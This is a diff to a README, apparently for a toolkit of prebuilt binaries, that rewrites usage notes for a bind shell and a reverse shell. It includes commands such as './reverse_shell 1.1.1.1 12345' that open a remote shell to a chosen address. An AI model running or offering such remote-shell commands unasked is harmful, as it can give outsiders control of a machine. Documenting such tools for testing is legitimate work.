@@ -17,8 +17,8 @@ all binaries are statically linked and stripped
 
 ## Bind/Reverse Shell binary
 
-run the bind shell without arguments like `./bind_shell` will listening on the port 3343 and `./bind_shell 6666` will listen on 6666.
-run the reverse shell binary will connect to 127.0.0.1:3343 , use a hex editor the change cstring cotains the ip/port.
+* run the bind shell without arguments like `./bind_shell` will listening on the port 3343 and `./bind_shell 6666` will listen on 6666.
+* run the reverse shell binary without arguments will connect to 127.0.0.1:3343 , one could use a hex editor the change cstring cotains the ip/port. or `./reverse_shell 1.1.1.1 12345` will connect to 1.1.1.1:12345; `./reverse_shell 1.1.1.1` will connect to 1.1.1.1:3343
 
 ## gdb (*Important*)
 
